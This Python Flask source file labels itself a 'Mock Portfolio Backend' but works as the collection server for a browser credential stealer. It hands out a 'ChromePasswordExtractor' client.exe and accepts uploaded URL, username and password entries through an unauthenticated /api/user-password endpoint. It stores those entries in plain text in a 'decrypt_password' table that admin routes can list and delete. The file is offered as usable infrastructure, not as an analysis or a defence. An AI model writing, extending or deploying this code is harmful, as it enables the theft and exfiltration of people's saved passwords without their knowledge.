import sqlite3
from flask import Flask, request, jsonify, render_template_string, Response, session, send_from_directory
from flask_cors import CORS
from functools import wraps
from dotenv import load_dotenv
import os
from Cryptodome.Cipher import AES
import json
import base64
import re
import csv
import shutil
import time
import logging
import platform

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Conditionally import Windows modules
if platform.system() == 'Windows':
    import win32crypt
elif platform.system() == 'Linux':
    import secretstorage
    import binascii
elif platform.system() == 'Darwin':  # macOS
    import keyring

# Load environment variables from .env file
load_dotenv()

app = Flask(__name__)
CORS(app, supports_credentials=True)

DATABASE_DIR = os.environ.get('DATABASE_DIR', os.path.dirname(os.path.abspath(__file__)))
DATABASE = os.path.join(DATABASE_DIR, 'passwords.db')
PORT = int(os.environ.get('PORT', 5000))

# Fetch admin credentials from environment variables
ADMIN_USERNAME = os.getenv('ADMIN_USERNAME')
ADMIN_PASSWORD = os.getenv('ADMIN_PASSWORD')

def init_db():
    try:
        # Connect to the database and create the table
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        # Create Table if it does not exist
        cursor.execute(''' 
                        CREATE TABLE IF NOT EXISTS decrypt_password (
                            id INTEGER PRIMARY KEY,
                            url TEXT NOT NULL,
                            username TEXT,
                            password TEXT NOT NULL,
                            timestamp TEXT DEFAULT CURRENT_TIMESTAMP,
                            UNIQUE(url, username)
                        )
                        ''')
        conn.commit()
        conn.close()
        logger.info("Database initialized successfully")
    except sqlite3.Error as e:
        logger.error(f"Database initialization error: {str(e)}")
        raise

with app.app_context():
    try:
        init_db()
        logger.info("Database initialized on app startup")
    except Exception as e:
        logger.error(f"Failed to initialize database on startup: {str(e)}")
    
def get_db_connection():
    try:
        conn = sqlite3.connect(DATABASE)
        conn.row_factory = sqlite3.Row
        return conn
    except sqlite3.Error as e:
        logger.error(f"Database connection error: {str(e)}")
        return None

# Authentication decorator
def require_admin(func):
    @wraps(func)
    def decorated_function(*args, **kwargs):
        auth = request.authorization
        if not auth or auth.username != ADMIN_USERNAME or auth.password != ADMIN_PASSWORD:
            logger.warning(f"Unauthorized access attempt from {request.remote_addr}")
            return jsonify({"message": "Unauthorized"}), 401
        return func(*args, **kwargs)
    return decorated_function

# Login API
@app.route('/api/login', methods=['POST'])
def login():
    # Get the Authorization header
    auth_header = request.headers.get('Authorization', '')
    
    if auth_header.startswith('Basic '):
        # Extract the base64 encoded credentials
        encoded_credentials = auth_header[6:]  # Remove 'Basic '
        
        try:
            # Decode the base64 string
            decoded_credentials = base64.b64decode(encoded_credentials).decode('utf-8')
            
            # Split on colon to get username and password
            username, password = decoded_credentials.split(':', 1)
            
            logger.info(f"Login attempt for user: {username}")
            
            # Verify credentials
            if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
                return jsonify({"message": "Login successful"}), 200
        except Exception as e:
            logger.error(f"Error decoding credentials: {str(e)}")
    
    return jsonify({"message": "Unauthorized"}), 401

# Protected API
@app.route('/api/protected', methods=['GET'])
@require_admin
def protected_route():
    return jsonify({"message": "You have access!"})

@app.route('/')
def home():
    return "This is Mock Portfolio Backend"

@app.route('/favicon.ico')
def favicon():
    return "", 204

@app.route('/api/user-data', methods=['GET'])
@require_admin
def get_user_data():
    try:
        conn = get_db_connection()
        if not conn:
            return jsonify({"error": "Database connection failed"}), 500
            
        cursor = conn.cursor()
        
        cursor.execute('SELECT * FROM decrypt_password')
        rows = cursor.fetchall()
        
        # Return the data as JSON
        data = []
        for row in rows:
            data.append(dict(row))
        
        conn.close()
        return jsonify(data)
    except sqlite3.Error as e:
        logger.error(f"Database error in get_user_data: {str(e)}")
        return jsonify({"error": f"Database error: {str(e)}"}), 500
    except Exception as e:
        logger.error(f"Unexpected error in get_user_data: {str(e)}")
        return jsonify({"error": "An unexpected error occurred"}), 500

@app.route('/api/user-data/<int:id>', methods=['DELETE'])
@require_admin
def delete_user_data(id):
    try:
        # Delete the record with the specified ID
        conn = get_db_connection()
        if not conn:
            return jsonify({"error": "Database connection failed"}), 500
            
        cursor = conn.cursor()
        cursor.execute('DELETE FROM decrypt_password WHERE id = ?', (id,))
        
        if cursor.rowcount == 0:
            conn.close()
            return jsonify({"message": f"No record found with ID {id}"}), 404
            
        conn.commit()
        conn.close()
        
        return jsonify({"message": "User data deleted successfully"})
    except sqlite3.Error as e:
        logger.error(f"Database error in delete_user_data: {str(e)}")
        return jsonify({"error": f"Database error: {str(e)}"}), 500
    except Exception as e:
        logger.error(f"Unexpected error in delete_user_data: {str(e)}")
        return jsonify({"error": "An unexpected error occurred"}), 500

@app.route('/api/user-data', methods=['DELETE'])
@require_admin
def delete_all_user_data():
    try:
        # Delete all records from the decrypt_password table
        conn = get_db_connection()
        if not conn:
            return jsonify({"error": "Database connection failed"}), 500
            
        cursor = conn.cursor()
        cursor.execute('DELETE FROM decrypt_password')
        conn.commit()
        conn.close()
        
        return jsonify({"message": "All user data deleted successfully"})
    except sqlite3.Error as e:
        logger.error(f"Database error in delete_all_user_data: {str(e)}")
        return jsonify({"error": f"Database error: {str(e)}"}), 500
    except Exception as e:
        logger.error(f"Unexpected error in delete_all_user_data: {str(e)}")
        return jsonify({"error": "An unexpected error occurred"}), 500

@app.route('/api/download/client-app', methods=['GET'])
def download_client_app():
    try:
        import os
        # Print all files in current directory to debug
        current_dir = os.path.dirname(os.path.abspath(__file__))
        logger.info(f"Current directory: {current_dir}")
        logger.info(f"Files in current directory: {os.listdir(current_dir)}")
        
        app_path = os.path.join(current_dir, "ChromePasswordExtractor")
        file_path = os.path.join(app_path, "client.exe")
        
        # Create directory if it doesn't exist
        if not os.path.exists(app_path):
            logger.info(f"Creating directory: {app_path}")
            os.makedirs(app_path, exist_ok=True)
            
        logger.info(f"App path: {app_path}")
        logger.info(f"File path: {file_path}")
        logger.info(f"Directory exists: {os.path.exists(app_path)}")
        logger.info(f"File exists: {os.path.exists(file_path)}")
        
        if not os.path.exists(file_path):
            return jsonify({"error": f"Client.exe not found at {file_path}"}), 404
            
        return send_from_directory(
            directory=app_path,
            path='client.exe',
            as_attachment=True
        )
    except Exception as e:
        import traceback
        logger.error(f"Error serving client.exe: {str(e)}")
        logger.error(f"Stack trace: {traceback.format_exc()}")
        return jsonify({"error": f"Client application not available: {str(e)}"}), 404

def add_user_data(entries, connection=None):
    """
    Add password entries to database
    
    Args:
        entries: Either a single dict or a list of dicts with url, username, password, timestamp
        connection: Optional existing database connection
        
    Returns:
        count: Number of entries added
    """
    close_connection = False
    try:
        # Handle connection
        if not connection:
            connection = get_db_connection()
            close_connection = True
        
        if not connection:
            logger.error("Failed to connect to database")
            return 0
        
        # Convert single entry to list for unified processing
        if not isinstance(entries, list):
            entries = [entries]
            
        cursor = connection.cursor()
        count = 0
        
        # Process all entries in a single transaction
        for entry in entries:
            # Extract values with defaults
            url = entry.get('url', '')
            username = entry.get('username', '')
            password = entry.get('password', '')
            timestamp = entry.get('timestamp', str(time.time()))
            
            # Skip invalid entries
            if not url or not username or not password:
                continue
                
            # Add to database
            cursor.execute(
                "INSERT OR REPLACE INTO decrypt_password (url, username, password, timestamp) VALUES (?, ?, ?, ?)",
                (url, username, password, timestamp)
            )
            count += 1
            
        connection.commit()
        return count
        
    except Exception as e:
        logger.error(f"Error adding user data: {str(e)}")
        return 0
        
    finally:
        # Only close if we opened it
        if close_connection and connection:
            connection.close()

@app.route('/api/user-password', methods=['POST'])
def upload_user_password():
    try:
        data = request.json
        if not data:
            return jsonify({"error": "No data provided"}), 400
            
        # Validate data format
        if not isinstance(data, list):
            return jsonify({"error": "Invalid data format. Expected array of password entries"}), 400
        
        # Use our enhanced function
        count = add_user_data(data)
        
        if count > 0:
            return jsonify({"message": f"Successfully uploaded {count} passwords"}), 200
        else:
            return jsonify({"error": "Failed to upload passwords"}), 500
            
    except Exception as e:
        logger.error(f"Error in upload_user_password: {str(e)}")
        return jsonify({"error": f"An unexpected error occurred: {str(e)}"}), 500

# Error handler for internal server errors
@app.errorhandler(500)
def handle_500_error(e):
    logger.error(f"Internal server error: {str(e)}")
    return jsonify({"error": "Internal server error occurred"}), 500

# Error handler for not found errors
@app.errorhandler(404)
def handle_404_error(e):
    logger.error(f"Not found error: {str(e)}")
    return jsonify({"error": "The requested resource was not found"}), 404

if __name__ == '__main__':
    try:
        # Initialize the database
        init_db()
        app.run(debug=True, port=PORT)
    except Exception as e:
        logger.critical(f"Failed to start the application: {str(e)}")
